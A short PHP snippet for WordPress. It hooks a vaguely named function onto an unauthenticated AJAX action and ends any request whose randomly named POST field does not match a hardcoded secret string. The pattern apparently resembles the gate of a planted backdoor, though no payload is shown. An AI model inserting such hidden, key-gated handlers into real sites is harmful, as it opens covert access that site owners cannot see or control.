<?php

function software_integrate_short_direct() {
	if (!isset($_POST["olmngaouhxtny"]) || $_POST["olmngaouhxtny"] !== "ipnUEBoZXPTBlJj") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'software_integrate_short_direct', 5, 1);
